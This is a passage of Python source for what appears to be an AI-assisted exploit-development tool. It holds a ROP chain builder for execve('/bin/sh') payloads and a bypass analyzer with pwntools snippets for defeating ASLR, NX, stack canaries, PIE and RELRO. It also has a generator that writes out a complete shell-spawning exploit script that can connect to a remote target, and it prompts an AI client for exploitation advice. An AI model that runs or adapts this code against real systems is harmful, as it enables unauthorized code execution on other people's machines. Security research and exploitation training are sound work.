        gadgets: List[RopGadget],
        target_address: int,
    ) -> Optional[GadgetChain]:
        """Build a chain to pivot the stack."""
        pivot_gadgets = [g for g in gadgets if g.category == "stack_pivot"]

        if not pivot_gadgets:
            return None

        # Find best pivot gadget
        best = max(pivot_gadgets, key=lambda g: g.quality_score)

        return GadgetChain(
            gadgets=[best],
            purpose=f"Pivot stack to {hex(target_address)}",
            payload_template=struct.pack("<Q", target_address) + struct.pack("<Q", best.address),
        )

    def _find_pop_gadget(
        self,
        gadgets: List[RopGadget],
        register: str,
    ) -> Optional[RopGadget]:
        """Find a gadget that pops into the specified register."""
        register = register.lower()

        # Find all gadgets that control this register
        matching = [g for g in gadgets if register in g.controllable_regs]

        if not matching:
            return None

        # Prefer gadgets with fewer side effects
        matching.sort(key=lambda g: (len(g.controllable_regs), -g.quality_score))

        return matching[0]

    def _generate_call_payload(
        self,
        gadgets: List[RopGadget],
        func_addr: int,
        args: List[int],
    ) -> bytes:
        """Generate payload bytes for function call."""
        payload = b""
        arg_idx = 0

        for gadget in gadgets:
            # Add gadget address
            payload += struct.pack("<Q" if self.word_size == 8 else "<I", gadget.address)

            # Add argument value for each controlled register
            for _ in gadget.controllable_regs:
                if arg_idx < len(args):
                    payload += struct.pack("<Q" if self.word_size == 8 else "<I", args[arg_idx])
                    arg_idx += 1

        # Add function address
        payload += struct.pack("<Q" if self.word_size == 8 else "<I", func_addr)

        return payload

    def _generate_execve_payload(
        self,
        gadgets: List[RopGadget],
        binsh_addr: int,
    ) -> bytes:
        """Generate payload for execve chain."""
        payload = b""

        for gadget in gadgets:
            payload += struct.pack("<Q", gadget.address)

            # Add appropriate values based on gadget
            if "rdi" in gadget.controllable_regs:
                payload += struct.pack("<Q", binsh_addr)  # /bin/sh address
            elif "rsi" in gadget.controllable_regs:
                payload += struct.pack("<Q", 0)  # NULL
            elif "rdx" in gadget.controllable_regs:
                payload += struct.pack("<Q", 0)  # NULL
            elif "rax" in gadget.controllable_regs:
                payload += struct.pack("<Q", 59)  # execve syscall number

        return payload


# =============================================================================
# Bypass Analyzer
# =============================================================================

class BypassAnalyzer:
    """Analyze and suggest security mitigation bypasses."""

    def analyze_bypasses(
        self,
        protections: SecurityFeatures,
        primitives: List[ExploitPrimitive],
        architecture: str = "x64",
    ) -> List[BypassStrategy]:
        """Suggest bypass strategies for enabled protections."""
        bypasses = []

        if protections.aslr:
            bypasses.extend(self._suggest_aslr_bypasses(primitives))

        if protections.dep:
            bypasses.extend(self._suggest_dep_bypasses(primitives, architecture))

        if protections.stack_canary:
            bypasses.extend(self._suggest_canary_bypasses(primitives))

        if protections.relro:
            bypasses.extend(self._suggest_relro_bypasses(primitives, protections.relro))

        if protections.pie:
            bypasses.extend(self._suggest_pie_bypasses(primitives))

        return bypasses

    def _suggest_aslr_bypasses(self, primitives: List[ExploitPrimitive]) -> List[BypassStrategy]:
        """Suggest ASLR bypass strategies."""
        bypasses = []

        if ExploitPrimitive.INFO_LEAK in primitives:
            bypasses.append(BypassStrategy(
                mitigation="ASLR",
                technique="Information Leak",
                description="Use existing info leak to disclose base addresses",
                requirements=["Ability to read leaked addresses"],
                success_probability=0.9,
                example_code="""
# Calculate base from leaked address
leaked_addr = leak_address()
libc_base = leaked_addr - known_offset
system_addr = libc_base + system_offset
""",
            ))

        bypasses.append(BypassStrategy(
            mitigation="ASLR",
            technique="Partial Overwrite",
            description="Overwrite only lower bytes of address (unchanged by ASLR)",
            requirements=["Target must be at predictable offset from corrupted pointer"],
            success_probability=0.3,
            example_code="""
# Overwrite only lower 2 bytes (unchanged by ASLR)
payload = b'A' * offset + p16(target_offset)
""",
        ))

        bypasses.append(BypassStrategy(
            mitigation="ASLR",
            technique="Brute Force",
            description="Brute force ASLR entropy (feasible on 32-bit)",
            requirements=["32-bit system or low entropy", "Crash-resilient target"],
            success_probability=0.1,
        ))

        if ExploitPrimitive.FORMAT_STRING in primitives:
            bypasses.append(BypassStrategy(
                mitigation="ASLR",
                technique="Format String Leak",
                description="Use format string to leak stack/heap addresses",
                requirements=["Format string vulnerability"],
                success_probability=0.85,
                example_code="""
# Leak addresses using format string
payload = b'%p.' * 20
# Parse leaked addresses from output
""",
            ))

        return bypasses

    def _suggest_dep_bypasses(
        self,
        primitives: List[ExploitPrimitive],
        arch: str,
    ) -> List[BypassStrategy]:
        """Suggest DEP/NX bypass strategies."""
        bypasses = []

        if ExploitPrimitive.ROP_CHAIN in primitives:
            bypasses.append(BypassStrategy(
                mitigation="DEP/NX",
                technique="ROP Chain",
                description="Use return-oriented programming to execute code",
                requirements=["Sufficient gadgets in binary/libraries"],
                success_probability=0.8,
                example_code="""
# Build ROP chain
rop = ROP(binary)
rop.call('system', [next(binary.search(b'/bin/sh'))])
payload = flat(rop.chain())
""",
            ))

        bypasses.append(BypassStrategy(
            mitigation="DEP/NX",
            technique="ret2libc",
            description="Return to libc functions like system()",
            requirements=["Known libc base address"],
            success_probability=0.75,
        ))

        bypasses.append(BypassStrategy(
            mitigation="DEP/NX",
            technique="mprotect ROP",
            description="Use ROP to call mprotect() and make shellcode executable",
            requirements=["mprotect gadget", "Controlled memory region"],
            success_probability=0.7,
            example_code="""
# ROP to call mprotect(shellcode_addr, size, PROT_READ|PROT_WRITE|PROT_EXEC)
rop = ROP(binary)
rop.mprotect(shellcode_page, 0x1000, 7)  # rwx
rop.raw(shellcode_addr)  # Jump to shellcode
""",
        ))

        if "64" in arch:
            bypasses.append(BypassStrategy(
                mitigation="DEP/NX",
                technique="ret2csu",
                description="Use __libc_csu_init gadgets for controlled calls",
                requirements=["Binary linked with glibc"],
                success_probability=0.65,
            ))

        return bypasses

    def _suggest_canary_bypasses(self, primitives: List[ExploitPrimitive]) -> List[BypassStrategy]:
        """Suggest stack canary bypass strategies."""
        bypasses = []

        if ExploitPrimitive.INFO_LEAK in primitives:
            bypasses.append(BypassStrategy(
                mitigation="Stack Canary",
                technique="Canary Leak",
                description="Leak canary value via info disclosure",
                requirements=["Ability to leak stack data"],
                success_probability=0.85,
                example_code="""
# Leak canary (usually at rbp-8 or offset from buffer)
canary = leak_stack_value(canary_offset)
# Include leaked canary in payload
payload = b'A' * buf_size + p64(canary) + b'B' * 8 + p64(ret_addr)
""",
            ))

        if ExploitPrimitive.FORMAT_STRING in primitives:
            bypasses.append(BypassStrategy(
                mitigation="Stack Canary",
                technique="Format String Leak",
                description="Use format string to read canary from stack",
                requirements=["Format string vulnerability"],
                success_probability=0.9,
                example_code="""
# Leak canary using format string
# Canary is typically at a known stack offset
payload = b'%17$p'  # Adjust offset as needed
""",
            ))

        bypasses.append(BypassStrategy(
            mitigation="Stack Canary",
            technique="Overwrite Canary with Same Value",
            description="Brute force canary byte-by-byte (if process forks)",
            requirements=["Forking server (canary same in children)"],
            success_probability=0.6,
            example_code="""
# Brute force canary byte by byte (256 * 7 attempts max)
canary = b'\\x00'  # First byte is always null
for i in range(7):
    for byte in range(256):
        test_canary = canary + bytes([byte])
        if try_exploit(test_canary):
            canary = test_canary
            break
""",
        ))

        bypasses.append(BypassStrategy(
            mitigation="Stack Canary",
            technique="Non-Stack Overflow",
            description="Exploit heap overflow or other non-stack vulnerability",
            requirements=["Vulnerability that doesn't overwrite canary"],
            success_probability=0.5,
        ))

        return bypasses

    def _suggest_relro_bypasses(
        self,
        primitives: List[ExploitPrimitive],
        relro_type: str,
    ) -> List[BypassStrategy]:
        """Suggest RELRO bypass strategies."""
        bypasses = []

        if relro_type == "partial":
            bypasses.append(BypassStrategy(
                mitigation="Partial RELRO",
                technique="GOT Overwrite",
                description="Overwrite GOT entries (still writable with partial RELRO)",
                requirements=["Arbitrary write primitive"],
                success_probability=0.8,
                example_code="""
# Overwrite GOT entry
got_puts = binary.got['puts']
write_primitive(got_puts, system_addr)
# Next call to puts() will call system()
""",
            ))

        if relro_type == "full":
            bypasses.append(BypassStrategy(
                mitigation="Full RELRO",
                technique="__malloc_hook Overwrite",
                description="Overwrite libc hooks (if available)",
                requirements=["Libc version with hooks", "Arbitrary write"],
                success_probability=0.5,
                example_code="""
# Overwrite __malloc_hook or __free_hook
malloc_hook = libc_base + libc.symbols['__malloc_hook']
write_primitive(malloc_hook, one_gadget_addr)
# Trigger malloc to get shell
""",
            ))

            bypasses.append(BypassStrategy(
                mitigation="Full RELRO",
                technique="Return Address Overwrite",
                description="Bypass GOT protection by directly overwriting return addresses",
                requirements=["Stack buffer overflow"],
                success_probability=0.7,
            ))

        return bypasses

    def _suggest_pie_bypasses(self, primitives: List[ExploitPrimitive]) -> List[BypassStrategy]:
        """Suggest PIE bypass strategies."""
        bypasses = []

        if ExploitPrimitive.INFO_LEAK in primitives:
            bypasses.append(BypassStrategy(
                mitigation="PIE",
                technique="Code Base Leak",
                description="Leak code address to calculate PIE base",
                requirements=["Ability to leak return addresses or code pointers"],
                success_probability=0.85,
                example_code="""
# Leak a return address from stack
ret_addr = leak_stack_value(ret_offset)
pie_base = ret_addr - known_offset
""",
            ))

        bypasses.append(BypassStrategy(
            mitigation="PIE",
            technique="Partial Overwrite",
            description="Overwrite only the lower bytes of code pointers",
            requirements=["Target function at predictable offset"],
            success_probability=0.25,
        ))

        return bypasses


# =============================================================================
# Exploit Synthesizer Service
# =============================================================================

class ExploitSynthesizer:
    """AI-assisted exploit development from crash to working PoC."""

    def __init__(self, ai_client: Optional[BinaryAIClient] = None):
        self.ai_client = ai_client
        self.gadget_finder = GadgetFinder()
        self.chain_builder = ChainBuilder()
        self.bypass_analyzer = BypassAnalyzer()

    async def synthesize_exploit(
        self,
        crash_analysis: CrashAnalysisResult,
        binary_profile: BinaryProfile,
        binary_data: Optional[bytes] = None,
    ) -> ExploitSynthesisResult:
        """Synthesize an exploit from crash analysis."""
        start_time = datetime.utcnow()

        # Extract primitives from crash analysis
        primitives = self._extract_primitives(crash_analysis)

        # Find gadgets if binary data provided
        gadgets = []
        if binary_data:
            gadgets = self.gadget_finder.find_gadgets(
                binary_data,
                base_address=0x400000,  # Default base
                architecture=binary_profile.architecture,
            )

        # Analyze bypasses
        bypass_suggestions = self.bypass_analyzer.analyze_bypasses(
            binary_profile.protections,
            primitives,
            binary_profile.architecture,
        )

        # Create exploit plan
        exploit_plan = await self._create_exploit_plan(
            crash_analysis,
            binary_profile,
            primitives,
            gadgets,
            bypass_suggestions,
        )

        # Generate exploit skeleton
        exploit_skeleton = await self._generate_skeleton(
            crash_analysis,
            binary_profile,
            exploit_plan,
            gadgets,
        )

        # Get AI reasoning
        ai_reasoning = ""
        confidence = 0.5

        if self.ai_client:
            try:
                ai_result = await self._ai_analyze_exploitation(
                    crash_analysis,
                    binary_profile,
                    exploit_plan,
                )
                ai_reasoning = ai_result.get("reasoning", "")
                confidence = ai_result.get("confidence", 0.5)
            except Exception as e:
                logger.warning(f"AI analysis failed: {e}")
                ai_reasoning = "AI analysis unavailable"

        synthesis_time = int((datetime.utcnow() - start_time).total_seconds() * 1000)

        return ExploitSynthesisResult(
            crash_id=crash_analysis.crash_id,
            exploitability=crash_analysis.exploitability,
            primitives_available=primitives,
            exploit_plan=exploit_plan,
            gadgets_found=gadgets[:100],  # Top 100 gadgets
            exploit_skeleton=exploit_skeleton,
            bypass_suggestions=bypass_suggestions,
            ai_reasoning=ai_reasoning,
            confidence=confidence,
            synthesis_time_ms=synthesis_time,
        )

    def _extract_primitives(self, crash: CrashAnalysisResult) -> List[ExploitPrimitive]:
        """Extract available exploit primitives from crash analysis."""
        primitives = []

        # Get primitives from crash analysis
        if crash.primitives:
            for primitive_analysis in crash.primitives:
                primitives.append(primitive_analysis.primitive)

        return primitives

    async def _create_exploit_plan(
        self,
        crash: CrashAnalysisResult,
        binary: BinaryProfile,
        primitives: List[ExploitPrimitive],
        gadgets: List[RopGadget],
        bypasses: List[BypassStrategy],
    ) -> Optional[ExploitPlan]:
        """Create a plan for exploitation."""
        # Determine best technique based on crash type and primitives
        technique = self._select_technique(crash, primitives, binary)

        if not technique:
            return None

        # Build steps based on technique
        steps = self._build_exploit_steps(technique, crash, binary, bypasses)

        # Build gadget chains if applicable
        chains = []
        if technique in [ExploitTechnique.ROP_CHAIN, ExploitTechnique.RET2LIBC]:
            chain = self._build_rop_chain_for_technique(gadgets, technique)
            if chain:
                chains.append(chain)

        # Identify constraints
        constraints = self._identify_constraints(crash, binary, primitives)

        # Calculate estimated success rate
        success_rate = self._estimate_success_rate(
            technique, binary.protections, primitives, bypasses
        )

        return ExploitPlan(
            technique=technique,
            steps=steps,
            gadget_chains=chains,
            bypass_strategies=bypasses,
            constraints=constraints,
            estimated_success_rate=success_rate,
            ai_reasoning="",  # Will be filled by AI
        )

    def _select_technique(
        self,
        crash: CrashAnalysisResult,
        primitives: List[ExploitPrimitive],
        binary: BinaryProfile,
    ) -> Optional[ExploitTechnique]:
        """Select the best exploitation technique."""
        crash_type = crash.crash_type

        # Map crash type to appropriate technique
        if crash_type == "STACK_BUFFER_OVERFLOW":
            if binary.protections.dep:
                return ExploitTechnique.ROP_CHAIN
            return ExploitTechnique.STACK_OVERFLOW

        elif crash_type == "HEAP_OVERFLOW":
            return ExploitTechnique.HEAP_OVERFLOW

        elif crash_type == "USE_AFTER_FREE":
            return ExploitTechnique.USE_AFTER_FREE

        elif crash_type == "FORMAT_STRING":
            return ExploitTechnique.FORMAT_STRING

        elif ExploitPrimitive.STACK_PIVOT in primitives:
            return ExploitTechnique.STACK_PIVOT

        elif ExploitPrimitive.ROP_CHAIN in primitives:
            return ExploitTechnique.ROP_CHAIN

        return ExploitTechnique.ROP_CHAIN  # Default fallback

    def _build_exploit_steps(
        self,
        technique: ExploitTechnique,
        crash: CrashAnalysisResult,
        binary: BinaryProfile,
        bypasses: List[BypassStrategy],
    ) -> List[str]:
        """Build exploitation steps."""
        steps = []

        # Common initial steps
        if binary.protections.aslr:
            steps.append("1. Leak memory address to defeat ASLR")

        if binary.protections.stack_canary:
            steps.append("2. Leak or bypass stack canary")

        # Technique-specific steps
        if technique == ExploitTechnique.STACK_OVERFLOW:
            steps.extend([
                "3. Calculate offset to return address",
                "4. Craft payload with shellcode or ROP chain",
                "5. Overwrite return address to redirect execution",
            ])

        elif technique == ExploitTechnique.ROP_CHAIN:
            steps.extend([
                "3. Find suitable ROP gadgets",
                "4. Build ROP chain to call system('/bin/sh') or execve",
                "5. Craft payload with gadget chain",
                "6. Trigger overflow to hijack control flow",
            ])

        elif technique == ExploitTechnique.HEAP_OVERFLOW:
            steps.extend([
                "3. Analyze heap layout and chunk metadata",
                "4. Craft heap overflow to corrupt adjacent chunk",
                "5. Achieve arbitrary write via corrupted metadata",
                "6. Overwrite function pointer or GOT entry",
            ])

        elif technique == ExploitTechnique.USE_AFTER_FREE:
            steps.extend([
                "3. Trigger object free",
                "4. Allocate controlled data in freed memory",
                "5. Use dangling pointer to achieve code execution",
            ])

        elif technique == ExploitTechnique.FORMAT_STRING:
            steps.extend([
                "3. Calculate stack offset to format string",
                "4. Leak addresses using %p or %x",
                "5. Use %n to write arbitrary values",
                "6. Overwrite return address or GOT entry",
            ])

        return steps

    def _build_rop_chain_for_technique(
        self,
        gadgets: List[RopGadget],
        technique: ExploitTechnique,
    ) -> Optional[GadgetChain]:
        """Build a ROP chain for the specified technique."""
        if not gadgets:
            return None

        if technique == ExploitTechnique.ROP_CHAIN:
            # Try to build execve chain
            chain = self.chain_builder.build_execve_chain(gadgets, 0)
            if chain:
                return chain

        elif technique == ExploitTechnique.RET2LIBC:
            # Build system('/bin/sh') call
            chain = self.chain_builder.build_call_chain(
                gadgets,
                0,  # system address placeholder
                [0],  # /bin/sh address placeholder
            )
            if chain:
                return chain

        return None

    def _identify_constraints(
        self,
        crash: CrashAnalysisResult,
        binary: BinaryProfile,
        primitives: List[ExploitPrimitive],
    ) -> List[ExploitConstraint]:
        """Identify constraints for exploitation."""
        constraints = []

        # ASLR constraint
        if binary.protections.aslr:
            has_leak = ExploitPrimitive.INFO_LEAK in primitives
            constraints.append(ExploitConstraint(
                name="ASLR",
                description="Address space layout is randomized",
                satisfied=has_leak,
                how_to_satisfy="Need information leak to disclose addresses" if not has_leak else None,
            ))

        # DEP constraint
        if binary.protections.dep:
            has_rop = ExploitPrimitive.ROP_CHAIN in primitives
            constraints.append(ExploitConstraint(
                name="DEP/NX",
                description="Stack/heap are non-executable",
                satisfied=has_rop,
                how_to_satisfy="Need ROP chain to bypass" if not has_rop else None,
            ))

        # Canary constraint
        if binary.protections.stack_canary:
            has_leak = ExploitPrimitive.INFO_LEAK in primitives
            constraints.append(ExploitConstraint(
                name="Stack Canary",
                description="Stack buffer overflow protected by canary",
                satisfied=has_leak,
                how_to_satisfy="Need to leak canary value" if not has_leak else None,
            ))

        return constraints

    def _estimate_success_rate(
        self,
        technique: ExploitTechnique,
        protections: SecurityFeatures,
        primitives: List[ExploitPrimitive],
        bypasses: List[BypassStrategy],
    ) -> float:
        """Estimate the probability of successful exploitation."""
        base_rate = 0.8  # Assume 80% base success rate

        # Reduce for each protection without bypass
        if protections.aslr and ExploitPrimitive.INFO_LEAK not in primitives:
            base_rate *= 0.3

        if protections.dep and ExploitPrimitive.ROP_CHAIN not in primitives:
            base_rate *= 0.2

        if protections.stack_canary and ExploitPrimitive.INFO_LEAK not in primitives:
            base_rate *= 0.4

        if protections.pie and ExploitPrimitive.INFO_LEAK not in primitives:
            base_rate *= 0.5

        # Increase for viable bypasses
        for bypass in bypasses:
            if bypass.success_probability > 0.7:
                base_rate = min(1.0, base_rate * 1.2)

        return min(1.0, max(0.0, base_rate))

    async def _generate_skeleton(
        self,
        crash: CrashAnalysisResult,
        binary: BinaryProfile,
        plan: Optional[ExploitPlan],
        gadgets: List[RopGadget],
    ) -> Optional[ExploitSkeleton]:
        """Generate exploit code skeleton."""
        if not plan:
            return None

        # Generate Python pwntools skeleton
        code = self._generate_pwntools_skeleton(crash, binary, plan, gadgets)

        placeholders = {
            "TARGET": "Path to target binary",
            "OFFSET": "Offset to return address/control point",
            "LIBC_BASE": "Leaked libc base address",
            "CANARY": "Leaked canary value (if applicable)",
        }

        return ExploitSkeleton(
            language="python",
            code=code,
            description=f"Exploit skeleton for {plan.technique.value}",
            placeholders=placeholders,
            gadgets_used=gadgets[:10],
            dependencies=["pwntools"],
            usage_instructions="""
1. Install pwntools: pip install pwntools
2. Adjust OFFSET based on actual crash analysis
3. Add leak functions if ASLR is enabled
4. Update libc offsets for target environment
5. Test locally before attempting remote exploitation
""",
        )

    def _generate_pwntools_skeleton(
        self,
        crash: CrashAnalysisResult,
        binary: BinaryProfile,
        plan: ExploitPlan,
        gadgets: List[RopGadget],
    ) -> str:
        """Generate pwntools exploit skeleton code."""
        skeleton = f'''#!/usr/bin/env python3
"""
Exploit Skeleton - {plan.technique.value}
Generated for: {binary.file_name}
Architecture: {binary.architecture}

Protections:
- ASLR: {binary.protections.aslr}
- DEP/NX: {binary.protections.dep}
- Stack Canary: {binary.protections.stack_canary}
- PIE: {binary.protections.pie}
- RELRO: {binary.protections.relro}

Crash Type: {crash.crash_type}
Exploitability: {crash.exploitability.value}
"""

from pwn import *

# Configuration
TARGET = "{binary.name if binary else './target_binary'}"
OFFSET = {crash.control_offset if hasattr(crash, 'control_offset') and crash.control_offset else 'CALCULATE_ME'}  # Calculate using pattern_create/pattern_offset
REMOTE_HOST = "{os.getenv('REMOTE_HOST', '')}"  # Set via environment or leave empty for local
REMOTE_PORT = {os.getenv('REMOTE_PORT', 0)}

# Load binary
binary = ELF(TARGET)
context.binary = binary
context.arch = "{binary.architecture}"
context.log_level = "debug"

# Load libc if needed
# libc = ELF("./libc.so.6")

def start():
    """Start process or connect to remote."""
    if REMOTE_HOST:
        return remote(REMOTE_HOST, REMOTE_PORT)
    return process(TARGET)

'''

        # Add leak function if ASLR enabled
        if binary.protections.aslr:
            skeleton += '''
def leak_address(p):
    """Leak an address to defeat ASLR."""
    # Implementation depends on vulnerability type
    # Modify this function based on your specific leak primitive

    # For format string vulnerability:
    if "{plan.technique == ExploitTechnique.FORMAT_STRING}":
        p.sendline(b"%p." * 10)
        leaked = p.recvuntil(b"\\n")
        addresses = leaked.split(b".")
        # Adjust index based on stack layout analysis
        return int(addresses[LEAK_OFFSET], 16)

    # For buffer overflow with partial overwrite:
    elif "{plan.technique == ExploitTechnique.PARTIAL_OVERWRITE}":
        # Send payload that triggers address leak
        p.sendline(b"A" * OFFSET)
        leak = p.recvuntil(b"\\n")
        return u64(leak[:8].ljust(8, b"\\x00"))

    # Generic approach: analyze crash output for leaked addresses
    else:
        p.sendline(b"LEAK")
        response = p.recvuntil(b"\\n")
        # Parse response for hex addresses (0x...)
        import re
        matches = re.findall(rb'0x[0-9a-fA-F]+', response)
        if matches:
            return int(matches[0], 16)
        return None

'''

        # Add canary leak if needed
        if binary.protections.stack_canary:
            skeleton += '''
def leak_canary(p):
    """Leak stack canary."""
    # Stack canary leak implementation
    # Common format string offsets: 17, 19, 23, 27 (platform-dependent)

    # Try common offsets for 64-bit systems
    common_offsets = [17, 19, 23, 27]

    for offset in common_offsets:
        p.sendline(f"%{{offset}}$p".encode())
        try:
            leak = p.recvline().strip()
            canary_value = int(leak, 16)

            # Canary should end in 0x00 (null byte terminator)
            if canary_value & 0xFF == 0:
                log.success(f"Stack canary leaked at offset {{offset}}: {{hex(canary_value)}}")
                return canary_value
        except:
            continue

    # Alternative: use buffer overflow to leak without null byte
    # Send payload up to but not including canary
    p.sendline(b"A" * (OFFSET - 8))
    leak = p.recv(8)
    canary_value = u64(leak)

    log.success(f"Stack canary leaked via overflow: {{hex(canary_value)}}")
    return canary_value

'''

        # Add ROP chain builder if needed
        if plan.technique in [ExploitTechnique.ROP_CHAIN, ExploitTechnique.RET2LIBC]:
            skeleton += '''
def build_rop_chain(base=0):
    """Build ROP chain for exploitation."""
    rop = ROP(binary)

    # Strategy 1: Direct execve if available
    try:
        if "execve" in binary.plt:
            binsh_addr = next(binary.search(b"/bin/sh\\x00"))
            rop.call("execve", [binsh_addr, 0, 0])
            log.success("Built ROP chain using direct execve")
            return rop.chain()
    except:
        pass

    # Strategy 2: ret2libc (if base address provided)
    if base != 0:
        try:
            # Uncomment and configure if libc available:
            # system = base + libc.symbols["system"]
            # binsh = base + next(libc.search(b"/bin/sh\\x00"))
            # rop.call(system, [binsh])
            # log.success("Built ret2libc ROP chain")
            # return rop.chain()
            pass
        except:
            pass

    # Strategy 3: Generic ROP chain
    # Find "/bin/sh" or create it on stack
    try:
        binsh_addr = next(binary.search(b"/bin/sh\\x00"))
    except StopIteration:
        # If no "/bin/sh" found, use read() to write it to .bss
        bss_addr = binary.bss()
        rop.read(0, bss_addr, 8)  # read "/bin/sh\\x00" from stdin
        binsh_addr = bss_addr

    # Find system() or use syscall
    if "system" in binary.plt:
        rop.system(binsh_addr)
    else:
        # Use execve syscall (Linux x86_64: rax=59, rdi=filename, rsi=0, rdx=0)
        rop.rax = 59
        rop.rdi = binsh_addr
        rop.rsi = 0
        rop.rdx = 0
        rop.syscall()

    log.success("Built ROP chain")
    return rop.chain()

'''

        # Add gadget comments
        if gadgets:
            skeleton += '''
# Useful Gadgets Found:
'''
            for i, g in enumerate(gadgets[:15]):
                skeleton += f'# {hex(g.address)}: {g.instructions}\n'
            skeleton += '\n'

        # Main exploit function
        skeleton += f'''
def exploit():
    """Main exploit function."""
    p = start()

'''

        if binary.protections.aslr:
            skeleton += '''    # Step 1: Leak address to defeat ASLR
    leaked = leak_address(p)
    log.success(f"Leaked address: {{hex(leaked)}}")
    # base = leaked - KNOWN_OFFSET

'''

        if binary.protections.stack_canary:
            skeleton += '''    # Step 2: Leak canary
    canary = leak_canary(p)
    log.success(f"Canary: {{hex(canary)}}")

'''

        skeleton += f'''    # Step 3: Build payload
    payload = b""
    payload += b"A" * OFFSET  # Padding to reach control point
'''

        if binary.protections.stack_canary:
            skeleton += '''    payload += p64(canary)  # Stack canary
    payload += b"B" * 8  # Saved RBP
'''

        if plan.technique == ExploitTechnique.ROP_CHAIN:
            skeleton += '''
    # ROP chain
    rop_chain = build_rop_chain()
    payload += rop_chain
'''
        else:
            skeleton += '''
    # Return address / shellcode
    # payload += p64(target_address)
'''

        skeleton += '''
    # Step 4: Send payload
    log.info(f"Payload length: {len(payload)}")
    p.sendline(payload)

    # Step 5: Get shell
    p.interactive()

if __name__ == "__main__":
    exploit()
'''

        return skeleton

    async def _ai_analyze_exploitation(
        self,
        crash: CrashAnalysisResult,
        binary: BinaryProfile,
        plan: Optional[ExploitPlan],
    ) -> Dict[str, Any]:
        """Get AI analysis of exploitation approach."""
        if not self.ai_client:
            return {"reasoning": "No AI client available", "confidence": 0.5}

        prompt = f"""Analyze this exploitation scenario and provide guidance.

Crash Information:
- Type: {crash.crash_type}
- Exploitability: {crash.exploitability.value}
- Available Primitives: {[str(p) for p in (crash.primitives or [])]}

Binary Profile:
- Architecture: {binary.architecture}
- File Type: {binary.file_type}
- Protections: ASLR={binary.protections.aslr}, DEP={binary.protections.dep}, Canary={binary.protections.stack_canary}, PIE={binary.protections.pie}

Proposed Technique: {plan.technique.value if plan else "Unknown"}

Provide:
1. Assessment of the proposed exploitation approach
2. Key challenges and how to overcome them
3. Alternative approaches to consider
4. Specific tips for this scenario
5. Confidence in successful exploitation (0-1)

Respond in JSON format with keys: reasoning, challenges, alternatives, tips, confidence
"""

        try:
            response = await self.ai_client.query(prompt)
            return response
        except Exception as e:
            logger.error(f"AI analysis failed: {e}")
            return {"reasoning": str(e), "confidence": 0.3}

    async def find_one_gadgets(
        self,
        libc_data: bytes,
        libc_version: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """Find one-gadget RCE addresses in libc."""
        # One-gadgets are single addresses in libc that give shell
        # Usually found at specific offsets with specific constraints

        one_gadgets = []

        # Common one-gadget patterns (x64)
        # These would normally be found by analyzing libc
        common_constraints = [
            {"constraint": "[rsp+0x30] == NULL", "registers": ["rsp"]},
            {"constraint": "[rsp+0x50] == NULL", "registers": ["rsp"]},
            {"constraint": "[rsp+0x70] == NULL", "registers": ["rsp"]},
            {"constraint": "rax == NULL", "registers": ["rax"]},
            {"constraint": "rbx == NULL", "registers": ["rbx"]},
        ]

        # Search for execve("/bin/sh", ...) call patterns
        # This is a simplified search - real implementation would use more sophisticated analysis

        patterns = [
            b"/bin/sh",
            b"execve",
        ]

        for pattern in patterns:
            offset = libc_data.find(pattern)
            while offset != -1:
                # Found potential one-gadget area
                # In reality, we'd analyze the control flow to find actual gadgets
                one_gadgets.append({
                    "offset": offset,
                    "pattern": pattern.decode("utf-8", errors="ignore"),
                    "constraints": common_constraints[len(one_gadgets) % len(common_constraints)],
                })
                offset = libc_data.find(pattern, offset + 1)

                if len(one_gadgets) >= 10:
                    break

        return one_gadgets

    def generate_shellcode(
        self,
        platform: str,
        architecture: str,
        payload_type: str = "execve",
    ) -> Optional[bytes]:
        """Generate shellcode for specified platform/architecture."""
        key = f"{platform}_{architecture}_{payload_type}"

        template = SHELLCODE_TEMPLATES.get(key)
        if template:
            return template["code"]

        # Try partial matches
        for name, template in SHELLCODE_TEMPLATES.items():
            if platform in name and architecture in name:
                return template["code"]

        return None


# =============================================================================
# Convenience Functions
# =============================================================================

async def synthesize_exploit_from_crash(
    crash_analysis: CrashAnalysisResult,
    binary_profile: BinaryProfile,
    binary_data: Optional[bytes] = None,
    ai_client: Optional[BinaryAIClient] = None,
) -> ExploitSynthesisResult:
    """Convenience function to synthesize exploit from crash analysis."""
    synthesizer = ExploitSynthesizer(ai_client)
    return await synthesizer.synthesize_exploit(
        crash_analysis,
        binary_profile,
        binary_data,
    )


def find_gadgets_in_binary(
    binary_data: bytes,
    base_address: int = 0x400000,
    architecture: str = "x64",
) -> List[RopGadget]:
    """Convenience function to find gadgets in binary."""
    finder = GadgetFinder()
    return finder.find_gadgets(binary_data, base_address, architecture)


def suggest_bypasses(
    protections: SecurityFeatures,
    primitives: List[ExploitPrimitive],
    architecture: str = "x64",
) -> List[BypassStrategy]:
    """Convenience function to suggest mitigation bypasses."""
    analyzer = BypassAnalyzer()
    return analyzer.analyze_bypasses(protections, primitives, architecture)
